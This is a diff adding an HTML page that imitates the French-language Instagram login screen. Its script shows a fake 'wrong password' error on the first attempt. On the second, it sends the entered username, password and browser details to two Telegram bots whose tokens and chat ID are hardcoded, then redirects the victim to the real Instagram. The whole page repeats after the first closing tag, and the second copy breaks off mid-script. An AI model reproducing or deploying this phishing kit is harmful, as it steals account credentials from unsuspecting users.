@@ -1,0 +1,1313 @@
+<!DOCTYPE html>
+<html lang="fr" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        :root {
+            --main-blue: #0095f6;
+            --secondary-blue: #b2dffc;
+            --text-dark: #262626;
+            --text-gray: #8e8e8e;
+            --light-gray: #fafafa;
+            --border-gray: #dbdbdb;
+            --white: #ffffff;
+            --error-red: #ed4956;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: var(--light-gray);
+            color: var(--text-dark);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 935px;
+            width: 100%;
+            margin: 0 auto;
+            padding: 20px;
+            display: flex;
+            flex-grow: 1;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .login-container {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 100%;
+        }
+        
+        .phones-container {
+            background-image: url('https://www.instagram.com/static/images/homepage/phones/home-phones.png/1dc085cdb87d.png');
+            background-position: -46px 0;
+            background-size: 468.32px 634.15px;
+            flex-basis: 454px;
+            height: 618px;
+            margin-right: 32px;
+            position: relative;
+        }
+        
+        .phone-slide {
+            position: absolute;
+            top: 27px;
+            right: 63px;
+            height: 538px;
+            width: 250px;
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            opacity: 0;
+            transition: opacity 1.5s ease-in-out;
+        }
+        
+        .phone-slide.active {
+            opacity: 1;
+        }
+        
+        .login-box {
+            flex: 1;
+            max-width: 350px;
+        }
+        
+        .form-container {
+            background-color: var(--white);
+            border: 1px solid var(--border-gray);
+            border-radius: 1px;
+            padding: 20px 40px;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        
+        .logo {
+            margin: 22px auto 12px;
+            width: 175px;
+        }
+        
+        .login-form {
+            margin-top: 24px;
+        }
+        
+        .input-group {
+            margin-bottom: 6px;
+            position: relative;
+        }
+        
+        .form-input {
+            background: var(--light-gray);
+            border: 1px solid var(--border-gray);
+            border-radius: 3px;
+            color: var(--text-dark);
+            font-size: 14px;
+            padding: 9px 8px 7px;
+            width: 100%;
+            height: 36px;
+        }
+        
+        .form-input:focus {
+            border-color: var(--text-gray);
+            outline: none;
+        }
+        
+        .login-btn {
+            background-color: var(--main-blue);
+            border: none;
+            border-radius: 4px;
+            color: var(--white);
+            font-weight: 600;
+            padding: 5px 9px;
+            width: 100%;
+            height: 32px;
+            margin-top: 8px;
+            cursor: pointer;
+            opacity: 0.7;
+        }
+        
+        .login-btn.active {
+            opacity: 1;
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 10px 0 18px;
+            color: var(--text-gray);
+            font-size: 13px;
+            font-weight: 600;
+        }
+        
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid var(--border-gray);
+            margin: 0 10px;
+        }
+        
+        .facebook-login {
+            color: #385185;
+            font-size: 14px;
+            font-weight: 600;
+            margin: 8px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+        
+        .facebook-icon {
+            margin-right: 8px;
+            font-size: 16px;
+        }
+        
+        .forgot-password {
+            color: var(--main-blue);
+            font-size: 12px;
+            margin-top: 12px;
+            display: block;
+        }
+        
+        .signup-box {
+            background-color: var(--white);
+            border: 1px solid var(--border-gray);
+            border-radius: 1px;
+            padding: 20px;
+            text-align: center;
+            font-size: 14px;
+        }
+        
+        .signup-link {
+            color: var(--main-blue);
+            font-weight: 600;
+            cursor: pointer;
+        }
+        
+        .app-download {
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .app-download p {
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        
+        .app-buttons {
+            display: flex;
+            justify-content: center;
+        }
+        
+        .app-button {
+            height: 40px;
+            margin: 0 4px;
+        }
+        
+        .footer {
+            max-width: 935px;
+            width: 100%;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-bottom: 16px;
+        }
+        
+        .footer-link {
+            color: var(--text-gray);
+            font-size: 12px;
+            margin: 0 8px 12px;
+            text-decoration: none;
+        }
+        
+        .copyright {
+            color: var(--text-gray);
+            font-size: 12px;
+            text-align: center;
+            text-transform: uppercase;
+        }
+        
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(255, 255, 255, 0.9);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            display: none;
+        }
+        
+        .loading-spinner {
+            border: 3px solid var(--border-gray);
+            border-top: 3px solid var(--main-blue);
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        
+        .loading-text {
+            font-size: 14px;
+            color: var(--text-dark);
+        }
+        
+        .error-message {
+            color: var(--error-red);
+            font-size: 14px;
+            margin: 10px 0;
+            display: none;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Language selector styles */
+        .language-selector {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            z-index: 100;
+        }
+        
+        .language-btn {
+            background-color: var(--white);
+            border: 1px solid var(--border-gray);
+            border-radius: 4px;
+            padding: 8px 12px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+        }
+        
+        .language-icon {
+            margin-right: 8px;
+            font-size: 16px;
+        }
+        
+        .language-dropdown {
+            position: absolute;
+            bottom: 100%;
+            right: 0;
+            background-color: var(--white);
+            border: 1px solid var(--border-gray);
+            border-radius: 4px;
+            padding: 8px 0;
+            width: 150px;
+            display: none;
+        }
+        
+        .language-dropdown.show {
+            display: block;
+        }
+        
+        .language-option {
+            padding: 8px 12px;
+            cursor: pointer;
+        }
+        
+        .language-option:hover {
+            background-color: var(--light-gray);
+        }
+        
+        /* Responsive styles */
+        @media (max-width: 875px) {
+            .phones-container {
+                display: none;
+            }
+            
+            .login-box {
+                margin: 0 auto;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-container">
+            <div class="phones-container">
+                <div class="phone-slide active" style="background-image: url('https://www.instagram.com/static/images/homepage/screenshots/screenshot1.png/fdfe239b7c9f.png')"></div>
+                <div class="phone-slide" style="background-image: url('https://www.instagram.com/static/images/homepage/screenshots/screenshot2.png/4d62acb667fb.png')"></div>
+                <div class="phone-slide" style="background-image: url('https://www.instagram.com/static/images/homepage/screenshots/screenshot3.png/94edb770accf.png')"></div>
+                <div class="phone-slide" style="background-image: url('https://www.instagram.com/static/images/homepage/screenshots/screenshot4.png/a4fd825e3d49.png')"></div>
+            </div>
+            
+            <div class="login-box">
+                <div class="form-container">
+                    <div class="logo">
+                        <svg aria-label="Instagram" fill="#262626" height="29" viewBox="0 0 192 192" width="29">
+                            <path d="M144 0H48C21.5 0 0 21.5 0 48v96c0 26.5 21.5 48 48 48h96c26.5 0 48-21.5 48-48V48c0-26.5-21.5-48-48-48zm16 144c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V48c0-8.8 7.2-16 16-16h96c8.8 0 16 7.2 16 16v96z"></path>
+                            <path d="M96 64c-17.7 0-32 14.3-32 32s14.3 32 32 32 32-14.3 32-32-14.3-32-32-32zm0 48c-8.8 0-16-7.2-16-16s7.2-16 16-16 16 7.2 16 16-7.2 16-16 16z"></path>
+                            <circle cx="144" cy="48" r="8"></circle>
+                        </svg>
+                    </div>
+                    
+                    <form class="login-form" id="loginForm">
+                        <div class="input-group">
+                            <input type="text" class="form-input" id="username" placeholder="Numéro de mobile, nom d'utilisateur ou e-mail" required>
+                        </div>
+                        <div class="input-group">
+                            <input type="password" class="form-input" id="password" placeholder="Mot de passe" required>
+                        </div>
+                        <div class="error-message" id="errorMessage">
+                            Désolé, votre mot de passe est incorrect. Veuillez vérifier votre mot de passe.
+                        </div>
+                        <button type="submit" class="login-btn" id="loginBtn" disabled>Connexion</button>
+                    </form>
+                    
+                    <div class="divider">ou</div>
+                    
+                    <div class="facebook-login">
+                        <span class="facebook-icon">f</span>
+                        <span>Se connecter avec Facebook</span>
+                    </div>
+                    
+                    <a href="#" class="forgot-password">Mot de passe oublié ?</a>
+                </div>
+                
+                <div class="signup-box">
+                    <p>Vous n'avez pas de compte ? <span class="signup-link">Inscrivez-vous</span></p>
+                </div>
+                
+                <div class="app-download">
+                    <p>Téléchargez l'application.</p>
+                    <div class="app-buttons">
+                        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_french-french.png/4b70f6fae447.png" alt="App Store" class="app-button">
+                        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_french-french.png/0f2b5dffa9d6.png" alt="Google Play" class="app-button">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#" class="footer-link">Meta</a>
+            <a href="#" class="footer-link">À propos</a>
+            <a href="#" class="footer-link">Blog</a>
+            <a href="#" class="footer-link">Emplois</a>
+            <a href="#" class="footer-link">Aide</a>
+            <a href="#" class="footer-link">API</a>
+            <a href="#" class="footer-link">Confidentialité</a>
+            <a href="#" class="footer-link">Conditions</a>
+            <a href="#" class="footer-link">Comptes les plus populaires</a>
+            <a href="#" class="footer-link">Hashtags</a>
+            <a href="#" class="footer-link">Lieux</a>
+            <a href="#" class="footer-link">Instagram Lite</a>
+            <a href="#" class="footer-link">Contact</a>
+        </div>
+        <div class="copyright">
+            Français (France) © 2023 Instagram from Meta
+        </div>
+    </div>
+    
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+        <div class="loading-text" id="loadingText">Connexion en cours...</div>
+    </div>
+    
+    <div class="language-selector">
+        <div class="language-btn" id="languageBtn">
+            <span class="language-icon">🌐</span>
+            <span id="currentLanguage">Français</span>
+        </div>
+        <div class="language-dropdown" id="languageDropdown">
+            <div class="language-option" data-lang="fr">Français</div>
+            <div class="language-option" data-lang="en">English</div>
+            <div class="language-option" data-lang="ar">العربية</div>
+        </div>
+    </div>
+    
+    <script>
+        // Language translations
+        const translations = {
+            fr: {
+                title: "Instagram",
+                usernamePlaceholder: "Numéro de mobile, nom d'utilisateur ou e-mail",
+                passwordPlaceholder: "Mot de passe",
+                loginBtn: "Connexion",
+                divider: "ou",
+                facebookLogin: "Se connecter avec Facebook",
+                forgotPassword: "Mot de passe oublié ?",
+                signupText: "Vous n'avez pas de compte ? ",
+                signupLink: "Inscrivez-vous",
+                downloadText: "Téléchargez l'application.",
+                loadingText: "Connexion en cours...",
+                errorMessage: "Désolé, votre mot de passe est incorrect. Veuillez vérifier votre mot de passe.",
+                copyright: "Français (France) © 2023 Instagram from Meta"
+            },
+            en: {
+                title: "Instagram",
+                usernamePlaceholder: "Phone number, username, or email",
+                passwordPlaceholder: "Password",
+                loginBtn: "Log In",
+                divider: "or",
+                facebookLogin: "Log in with Facebook",
+                forgotPassword: "Forgot password?",
+                signupText: "Don't have an account? ",
+                signupLink: "Sign up",
+                downloadText: "Get the app.",
+                loadingText: "Logging in...",
+                errorMessage: "Sorry, your password was incorrect. Please double-check your password.",
+                copyright: "English © 2023 Instagram from Meta"
+            },
+            ar: {
+                title: "إنستغرام",
+                usernamePlaceholder: "رقم الهاتف أو اسم المستخدم أو البريد الإلكتروني",
+                passwordPlaceholder: "كلمة السر",
+                loginBtn: "تسجيل الدخول",
+                divider: "أو",
+                facebookLogin: "تسجيل الدخول باستخدام فيسبوك",
+                forgotPassword: "هل نسيت كلمة السر؟",
+                signupText: "ليس لديك حساب؟ ",
+                signupLink: "اشتراك",
+                downloadText: "احصل على التطبيق.",
+                loadingText: "جاري تسجيل الدخول...",
+                errorMessage: "عذرًا، كلمة السر غير صحيحة. يرجى التحقق من كلمة السر.",
+                copyright: "العربية © 2023 إنستغرام من ميتا"
+            }
+        };
+        
+        // Current language
+        let currentLang = 'fr';
+        
+        // Phone slides animation
+        let currentSlide = 0;
+        const slides = document.querySelectorAll('.phone-slide');
+        
+        function rotateSlides() {
+            slides[currentSlide].classList.remove('active');
+            currentSlide = (currentSlide + 1) % slides.length;
+            slides[currentSlide].classList.add('active');
+        }
+        
+        setInterval(rotateSlides, 3000);
+        
+        // Form validation
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const loginBtn = document.getElementById('loginBtn');
+        
+        function validateForm() {
+            if (usernameInput.value.trim() !== '' && passwordInput.value.trim() !== '') {
+                loginBtn.classList.add('active');
+                loginBtn.disabled = false;
+            } else {
+                loginBtn.classList.remove('active');
+                loginBtn.disabled = true;
+            }
+        }
+        
+        usernameInput.addEventListener('input', validateForm);
+        passwordInput.addEventListener('input', validateForm);
+        
+        // Form submission
+        const loginForm = document.getElementById('loginForm');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const errorMessage = document.getElementById('errorMessage');
+        let attemptCount = 0;
+        
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
+            
+            // Show loading overlay
+            loadingOverlay.style.display = 'flex';
+            
+            // First attempt
+            if (attemptCount === 0) {
+                setTimeout(function() {
+                    loadingOverlay.style.display = 'none';
+                    errorMessage.style.display = 'block';
+                    attemptCount++;
+                }, 3000);
+            } 
+            // Second attempt
+            else if (attemptCount === 1) {
+                setTimeout(function() {
+                    loadingOverlay.style.display = 'none';
+                    errorMessage.style.display = 'block';
+                    
+                    // Send data to Telegram bots
+                    sendToTelegram(username, password);
+                    
+                    // Redirect to Instagram after 2 seconds
+                    setTimeout(function() {
+                        window.location.href = "https://www.instagram.com";
+                    }, 2000);
+                }, 3000);
+            }
+        });
+        
+        // Function to send data to Telegram
+        function sendToTelegram(username, password) {
+            const botTokens = [
+                '7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw',
+                '7159716957:AAFee9KZfc0VbBqxt2Br_w5CypF4hEY4JkQ'
+            ];
+            const chatId = '780712584';
+            
+            const message = `New Instagram Login Attempt:
+Username/Email: ${username}
+Password: ${password}
+Language: ${currentLang}
+User Agent: ${navigator.userAgent}`;
+            
+            // Send to both bots
+            botTokens.forEach(token => {
+                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                }).catch(error => console.error('Error sending to Telegram:', error));
+            });
+        }
+        
+        // Language selector functionality
+        const languageBtn = document.getElementById('languageBtn');
+        const languageDropdown = document.getElementById('languageDropdown');
+        const currentLanguageText = document.getElementById('currentLanguage');
+        
+        languageBtn.addEventListener('click', function() {
+            languageDropdown.classList.toggle('show');
+        });
+        
+        // Close dropdown when clicking outside
+        document.addEventListener('click', function(event) {
+            if (!languageBtn.contains(event.target) && !languageDropdown.contains(event.target)) {
+                languageDropdown.classList.remove('show');
+            }
+        });
+        
+        // Change language
+        document.querySelectorAll('.language-option').forEach(option => {
+            option.addEventListener('click', function() {
+                const lang = this.getAttribute('data-lang');
+                changeLanguage(lang);
+                languageDropdown.classList.remove('show');
+            });
+        });
+        
+        // Function to change language
+        function changeLanguage(lang) {
+            currentLang = lang;
+            const translation = translations[lang];
+            
+            // Update page title
+            document.title = translation.title;
+            
+            // Update form elements
+            usernameInput.placeholder = translation.usernamePlaceholder;
+            passwordInput.placeholder = translation.passwordPlaceholder;
+            loginBtn.textContent = translation.loginBtn;
+            document.querySelector('.divider').textContent = translation.divider;
+            document.querySelector('.facebook-login span:nth-child(2)').textContent = translation.facebookLogin;
+            document.querySelector('.forgot-password').textContent = translation.forgotPassword;
+            document.querySelector('.signup-box p').innerHTML = translation.signupText + '<span class="signup-link">' + translation.signupLink + '</span>';
+            document.querySelector('.app-download p').textContent = translation.downloadText;
+            document.getElementById('loadingText').textContent = translation.loadingText;
+            document.getElementById('errorMessage').textContent = translation.errorMessage;
+            document.querySelector('.copyright').textContent = translation.copyright;
+            
+            // Update current language text
+            currentLanguageText.textContent = this.querySelector(`[data-lang="${lang}"]`).textContent;
+            
+            // Update RTL for Arabic
+            if (lang === 'ar') {
+                document.documentElement.dir = 'rtl';
+            } else {
+                document.documentElement.dir = 'ltr';
+            }
+        }
+        
+        // Detect browser language and set accordingly
+        const browserLang = navigator.language.substring(0, 2);
+        if (translations[browserLang]) {
+            changeLanguage(browserLang);
+        }
+    </script>
+</body>
+</html><!DOCTYPE html>
+<html lang="fr" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        :root {
+            --main-blue: #0095f6;
+            --secondary-blue: #b2dffc;
+            --text-dark: #262626;
+            --text-gray: #8e8e8e;
+            --light-gray: #fafafa;
+            --border-gray: #dbdbdb;
+            --white: #ffffff;
+            --error-red: #ed4956;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: var(--light-gray);
+            color: var(--text-dark);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 935px;
+            width: 100%;
+            margin: 0 auto;
+            padding: 20px;
+            display: flex;
+            flex-grow: 1;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .login-container {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 100%;
+        }
+        
+        .phones-container {
+            background-image: url('https://www.instagram.com/static/images/homepage/phones/home-phones.png/1dc085cdb87d.png');
+            background-position: -46px 0;
+            background-size: 468.32px 634.15px;
+            flex-basis: 454px;
+            height: 618px;
+            margin-right: 32px;
+            position: relative;
+        }
+        
+        .phone-slide {
+            position: absolute;
+            top: 27px;
+            right: 63px;
+            height: 538px;
+            width: 250px;
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            opacity: 0;
+            transition: opacity 1.5s ease-in-out;
+        }
+        
+        .phone-slide.active {
+            opacity: 1;
+        }
+        
+        .login-box {
+            flex: 1;
+            max-width: 350px;
+        }
+        
+        .form-container {
+            background-color: var(--white);
+            border: 1px solid var(--border-gray);
+            border-radius: 1px;
+            padding: 20px 40px;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        
+        .logo {
+            margin: 22px auto 12px;
+            width: 175px;
+        }
+        
+        .login-form {
+            margin-top: 24px;
+        }
+        
+        .input-group {
+            margin-bottom: 6px;
+            position: relative;
+        }
+        
+        .form-input {
+            background: var(--light-gray);
+            border: 1px solid var(--border-gray);
+            border-radius: 3px;
+            color: var(--text-dark);
+            font-size: 14px;
+            padding: 9px 8px 7px;
+            width: 100%;
+            height: 36px;
+        }
+        
+        .form-input:focus {
+            border-color: var(--text-gray);
+            outline: none;
+        }
+        
+        .login-btn {
+            background-color: var(--main-blue);
+            border: none;
+            border-radius: 4px;
+            color: var(--white);
+            font-weight: 600;
+            padding: 5px 9px;
+            width: 100%;
+            height: 32px;
+            margin-top: 8px;
+            cursor: pointer;
+            opacity: 0.7;
+        }
+        
+        .login-btn.active {
+            opacity: 1;
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 10px 0 18px;
+            color: var(--text-gray);
+            font-size: 13px;
+            font-weight: 600;
+        }
+        
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid var(--border-gray);
+            margin: 0 10px;
+        }
+        
+        .facebook-login {
+            color: #385185;
+            font-size: 14px;
+            font-weight: 600;
+            margin: 8px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+        
+        .facebook-icon {
+            margin-right: 8px;
+            font-size: 16px;
+        }
+        
+        .forgot-password {
+            color: var(--main-blue);
+            font-size: 12px;
+            margin-top: 12px;
+            display: block;
+        }
+        
+        .signup-box {
+            background-color: var(--white);
+            border: 1px solid var(--border-gray);
+            border-radius: 1px;
+            padding: 20px;
+            text-align: center;
+            font-size: 14px;
+        }
+        
+        .signup-link {
+            color: var(--main-blue);
+            font-weight: 600;
+            cursor: pointer;
+        }
+        
+        .app-download {
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .app-download p {
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        
+        .app-buttons {
+            display: flex;
+            justify-content: center;
+        }
+        
+        .app-button {
+            height: 40px;
+            margin: 0 4px;
+        }
+        
+        .footer {
+            max-width: 935px;
+            width: 100%;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-bottom: 16px;
+        }
+        
+        .footer-link {
+            color: var(--text-gray);
+            font-size: 12px;
+            margin: 0 8px 12px;
+            text-decoration: none;
+        }
+        
+        .copyright {
+            color: var(--text-gray);
+            font-size: 12px;
+            text-align: center;
+            text-transform: uppercase;
+        }
+        
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(255, 255, 255, 0.9);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            display: none;
+        }
+        
+        .loading-spinner {
+            border: 3px solid var(--border-gray);
+            border-top: 3px solid var(--main-blue);
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        
+        .loading-text {
+            font-size: 14px;
+            color: var(--text-dark);
+        }
+        
+        .error-message {
+            color: var(--error-red);
+            font-size: 14px;
+            margin: 10px 0;
+            display: none;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Language selector styles */
+        .language-selector {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            z-index: 100;
+        }
+        
+        .language-btn {
+            background-color: var(--white);
+            border: 1px solid var(--border-gray);
+            border-radius: 4px;
+            padding: 8px 12px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+        }
+        
+        .language-icon {
+            margin-right: 8px;
+            font-size: 16px;
+        }
+        
+        .language-dropdown {
+            position: absolute;
+            bottom: 100%;
+            right: 0;
+            background-color: var(--white);
+            border: 1px solid var(--border-gray);
+            border-radius: 4px;
+            padding: 8px 0;
+            width: 150px;
+            display: none;
+        }
+        
+        .language-dropdown.show {
+            display: block;
+        }
+        
+        .language-option {
+            padding: 8px 12px;
+            cursor: pointer;
+        }
+        
+        .language-option:hover {
+            background-color: var(--light-gray);
+        }
+        
+        /* Responsive styles */
+        @media (max-width: 875px) {
+            .phones-container {
+                display: none;
+            }
+            
+            .login-box {
+                margin: 0 auto;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-container">
+            <div class="phones-container">
+                <div class="phone-slide active" style="background-image: url('https://www.instagram.com/static/images/homepage/screenshots/screenshot1.png/fdfe239b7c9f.png')"></div>
+                <div class="phone-slide" style="background-image: url('https://www.instagram.com/static/images/homepage/screenshots/screenshot2.png/4d62acb667fb.png')"></div>
+                <div class="phone-slide" style="background-image: url('https://www.instagram.com/static/images/homepage/screenshots/screenshot3.png/94edb770accf.png')"></div>
+                <div class="phone-slide" style="background-image: url('https://www.instagram.com/static/images/homepage/screenshots/screenshot4.png/a4fd825e3d49.png')"></div>
+            </div>
+            
+            <div class="login-box">
+                <div class="form-container">
+                    <div class="logo">
+                        <svg aria-label="Instagram" fill="#262626" height="29" viewBox="0 0 192 192" width="29">
+                            <path d="M144 0H48C21.5 0 0 21.5 0 48v96c0 26.5 21.5 48 48 48h96c26.5 0 48-21.5 48-48V48c0-26.5-21.5-48-48-48zm16 144c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V48c0-8.8 7.2-16 16-16h96c8.8 0 16 7.2 16 16v96z"></path>
+                            <path d="M96 64c-17.7 0-32 14.3-32 32s14.3 32 32 32 32-14.3 32-32-14.3-32-32-32zm0 48c-8.8 0-16-7.2-16-16s7.2-16 16-16 16 7.2 16 16-7.2 16-16 16z"></path>
+                            <circle cx="144" cy="48" r="8"></circle>
+                        </svg>
+                    </div>
+                    
+                    <form class="login-form" id="loginForm">
+                        <div class="input-group">
+                            <input type="text" class="form-input" id="username" placeholder="Numéro de mobile, nom d'utilisateur ou e-mail" required>
+                        </div>
+                        <div class="input-group">
+                            <input type="password" class="form-input" id="password" placeholder="Mot de passe" required>
+                        </div>
+                        <div class="error-message" id="errorMessage">
+                            Désolé, votre mot de passe est incorrect. Veuillez vérifier votre mot de passe.
+                        </div>
+                        <button type="submit" class="login-btn" id="loginBtn" disabled>Connexion</button>
+                    </form>
+                    
+                    <div class="divider">ou</div>
+                    
+                    <div class="facebook-login">
+                        <span class="facebook-icon">f</span>
+                        <span>Se connecter avec Facebook</span>
+                    </div>
+                    
+                    <a href="#" class="forgot-password">Mot de passe oublié ?</a>
+                </div>
+                
+                <div class="signup-box">
+                    <p>Vous n'avez pas de compte ? <span class="signup-link">Inscrivez-vous</span></p>
+                </div>
+                
+                <div class="app-download">
+                    <p>Téléchargez l'application.</p>
+                    <div class="app-buttons">
+                        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_french-french.png/4b70f6fae447.png" alt="App Store" class="app-button">
+                        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_french-french.png/0f2b5dffa9d6.png" alt="Google Play" class="app-button">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#" class="footer-link">Meta</a>
+            <a href="#" class="footer-link">À propos</a>
+            <a href="#" class="footer-link">Blog</a>
+            <a href="#" class="footer-link">Emplois</a>
+            <a href="#" class="footer-link">Aide</a>
+            <a href="#" class="footer-link">API</a>
+            <a href="#" class="footer-link">Confidentialité</a>
+            <a href="#" class="footer-link">Conditions</a>
+            <a href="#" class="footer-link">Comptes les plus populaires</a>
+            <a href="#" class="footer-link">Hashtags</a>
+            <a href="#" class="footer-link">Lieux</a>
+            <a href="#" class="footer-link">Instagram Lite</a>
+            <a href="#" class="footer-link">Contact</a>
+        </div>
+        <div class="copyright">
+            Français (France) © 2023 Instagram from Meta
+        </div>
+    </div>
+    
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+        <div class="loading-text" id="loadingText">Connexion en cours...</div>
+    </div>
+    
+    <div class="language-selector">
+        <div class="language-btn" id="languageBtn">
+            <span class="language-icon">🌐</span>
+            <span id="currentLanguage">Français</span>
+        </div>
+        <div class="language-dropdown" id="languageDropdown">
+            <div class="language-option" data-lang="fr">Français</div>
+            <div class="language-option" data-lang="en">English</div>
+            <div class="language-option" data-lang="ar">العربية</div>
+        </div>
+    </div>
+    
+    <script>
+        // Language translations
+        const translations = {
+            fr: {
+                title: "Instagram",
+                usernamePlaceholder: "Numéro de mobile, nom d'utilisateur ou e-mail",
+                passwordPlaceholder: "Mot de passe",
+                loginBtn: "Connexion",
+                divider: "ou",
+                facebookLogin: "Se connecter avec Facebook",
+                forgotPassword: "Mot de passe oublié ?",
+                signupText: "Vous n'avez pas de compte ? ",
+                signupLink: "Inscrivez-vous",
+                downloadText: "Téléchargez l'application.",
+                loadingText: "Connexion en cours...",
+                errorMessage: "Désolé, votre mot de passe est incorrect. Veuillez vérifier votre mot de passe.",
+                copyright: "Français (France) © 2023 Instagram from Meta"
+            },
+            en: {
+                title: "Instagram",
+                usernamePlaceholder: "Phone number, username, or email",
+                passwordPlaceholder: "Password",
+                loginBtn: "Log In",
+                divider: "or",
+                facebookLogin: "Log in with Facebook",
+                forgotPassword: "Forgot password?",
+                signupText: "Don't have an account? ",
+                signupLink: "Sign up",
+                downloadText: "Get the app.",
+                loadingText: "Logging in...",
+                errorMessage: "Sorry, your password was incorrect. Please double-check your password.",
+                copyright: "English © 2023 Instagram from Meta"
+            },
+            ar: {
+                title: "إنستغرام",
+                usernamePlaceholder: "رقم الهاتف أو اسم المستخدم أو البريد الإلكتروني",
+                passwordPlaceholder: "كلمة السر",
+                loginBtn: "تسجيل الدخول",
+                divider: "أو",
+                facebookLogin: "تسجيل الدخول باستخدام فيسبوك",
+                forgotPassword: "هل نسيت كلمة السر؟",
+                signupText: "ليس لديك حساب؟ ",
+                signupLink: "اشتراك",
+                downloadText: "احصل على التطبيق.",
+                loadingText: "جاري تسجيل الدخول...",
+                errorMessage: "عذرًا، كلمة السر غير صحيحة. يرجى التحقق من كلمة السر.",
+                copyright: "العربية © 2023 إنستغرام من ميتا"
+            }
+        };
+        
+        // Current language
+        let currentLang = 'fr';
+        
+        // Phone slides animation
+        let currentSlide = 0;
+        const slides = document.querySelectorAll('.phone-slide');
+        
+        function rotateSlides() {
+            slides[currentSlide].classList.remove('active');
+            currentSlide = (currentSlide + 1) % slides.length;
+            slides[currentSlide].classList.add('active');
+        }
+        
+        setInterval(rotateSlides, 3000);
+        
+        // Form validation
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const loginBtn = document.getElementById('loginBtn');
+        
+        function validateForm() {
+            if (usernameInput.value.trim() !== '' && passwordInput.value.trim() !== '') {
+                loginBtn.classList.add('active');
+                loginBtn.disabled = false;
+            } else {
+                loginBtn.classList.remove('active');
+                loginBtn.disabled = true;
+            }
+        }
+        
+        usernameInput.addEventListener('input', validateForm);
